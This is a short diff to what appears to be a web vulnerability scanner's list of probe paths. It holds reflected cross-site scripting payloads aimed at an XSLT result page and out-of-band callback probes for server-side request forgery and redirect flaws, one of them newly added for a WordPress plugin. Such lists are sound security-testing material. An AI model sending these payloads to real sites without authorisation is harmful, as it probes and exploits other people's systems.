@@ -64,3 +64,4 @@
 /portal/XsltResultControllerHtml.jsp?xslContent=&interfaceInstanceId=&lumPageId=<script>confirm(document.domain)</script>&xslContentFilePath=
 /XsltResultControllerHtml.jsp?xslContent=&interfaceInstanceId=&lumPageId=<script>confirm(document.domain)</script>&xslContentFilePath=
 /o/get/resource?url=https://{{interactsh-url}}
+/wp-content/plugins/wccp-pro/no-js.php?referrer=https://oast.pro
